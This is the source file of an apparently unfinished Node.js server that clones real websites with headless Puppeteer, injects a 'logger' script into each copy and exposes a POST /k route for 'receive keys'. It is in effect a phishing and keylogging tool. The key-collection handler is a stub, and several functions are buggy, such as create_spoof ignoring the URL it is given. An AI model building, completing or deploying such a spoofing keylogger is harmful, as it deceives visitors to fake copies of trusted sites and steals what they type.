const exp = require('express')
const axios = require('axios').default
const cheer = require('cheerio').default
const puppet = require('puppeteer')
const fsp = require('fs/promises')
const fs = require('fs')
const isURL = require('is-url')
const path = require('path')
const bodyparser = require('body-parser')
const Page = require('./models/Page')
let spoofURL = "https://www.google.com"
const log = console.log
const PORT = 8888
const app = exp()

// PAGE CACHES
// tmp testing pages
let downloaded_page = ''
let rendered_page = ''
// production pages
const page_cache = {

}

// LOGGER
const logger_script = fs.readFileSync(path.join(__dirname,'scripts', 'l.min.js'), 'utf-8')

// check for args
let args = process.argv
if(args[2] && isURL(args[2])){
    log(`URL argument present - ${args[2]}`)
    // set optional arg to spoofURL
    spoofURL = args[2]

} 

// start headless browser
async function download_page(url){
    log('Fetching')
    const browser = await puppet.launch() // launch browser
    const page = await browser.newPage() // open page
    page_object = page
    await page.goto(spoofURL, {
        waitUntil: "networkidle2"
    })
    downloaded_page = await page.content() // download content
    await page.close() // closes tab
    await browser.close() // close browser
}
function render_page(url){
    log('Rendering page')
//  parse to dom and alter paths
    let dom = cheer.load(downloaded_page)
    // replace image paths
    dom('img').each((i, el)=>{
        let src = el.attribs.src
        let newSrc = spoofURL + src
        log(i + "  " + newSrc)
        el.attribs['src'] = newSrc
    })
    // insert logger script from
    dom('body').append(`<script>${logger_script}</script>`)
    // set rendered page to active html string for main / route
    rendered_page = dom.html()
    createLog(rendered_page)
    log(rendered_page)
    log(`${spoofURL} spoof rendered.`)
}

async function initiate(){
    await download_page()
    render_page()

}




// Entry
initiate()





// startup
app.listen(PORT, (err) => {
    if (err) log(err)
    log(`Server running on port ${PORT}`)
})

// MIDDLEWARE
app.use(bodyparser.urlencoded({extended: false}))
app.use(bodyparser.json())
app.use('/scripts', exp.static('scripts'))
app.use(exp.static('templates'))


// ROUTING
// home test
app.get('/home', (req, res)=>{
    res.sendFile(path.join(__dirname, "templates", "index.html"))
})
// spoof page
app.get('/:spoof_url', (req, res)=>{
    // 404 on non existant spoof or invalid url
    if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
    if(!page_cache[req.params.spoof_url]) return res.sendStatus(404)
    res.send(page_cache[req.params.spoof_url].rendered_page)
})

// main page
app.get('/', (req, res) => {
    res.send(rendered_page)
})
// initiate new spoof
app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
    let url_2_spoof = decodeURI(req.body.url)
    log(`Spoof request for __ ${url_2_spoof} __`)
    let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
    return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
})
// receive keys
app.post('/k', async (req, res)=>{
    // log(req.body.key)

    // handle sending the key to the correct socket session

    return res.sendStatus(200)
})
async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
    let new_page = new Page()
    new_page.download_page = await download_page(url)
    new_page.rendered_page = await render_page(url)
    new_page.url = url
    page_cache[url] = new_page // set into global pages object
    // create socket session


    return new_page.url
}





// DEBUGGING
// easy to view log of rendered input/output
async function createLog(string){
    let filename = "log.txt"
    await fsp.writeFile(path.join(__dirname, "logs", filename), `rendered page - \n ${string}\ndownloaded page - \n ${downloaded_page}`)

}
